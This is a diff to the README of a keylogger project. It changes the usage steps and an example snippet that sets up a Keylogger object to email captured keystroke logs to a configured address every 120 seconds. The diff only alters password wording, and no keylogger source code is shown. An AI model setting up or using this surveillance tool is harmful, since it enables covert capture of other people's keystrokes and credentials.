@@ -31,7 +31,7 @@ Before running the scripts, ensure the following:
 ## Usage
 1. Open `keylogger.py` and set the following:
    - `email`: Your email address (to receive logs).
-   - `password`: The email account's password or app password.
+   - `password`: The email account's password.
    - `time_interval`: Time in seconds between email reports.
 
 2. Run the keylogger using:
@@ -45,7 +45,7 @@ Before running the scripts, ensure the following:
 ```python
 # zkeylogger.py
 import keylogger
-my_keylogger = keylogger.Keylogger(120, "your-email@zoho.com", "your-app-password")
+my_keylogger = keylogger.Keylogger(120, "your-email@zoho.com", "your-email-password")
 my_keylogger.start()
 ```
 
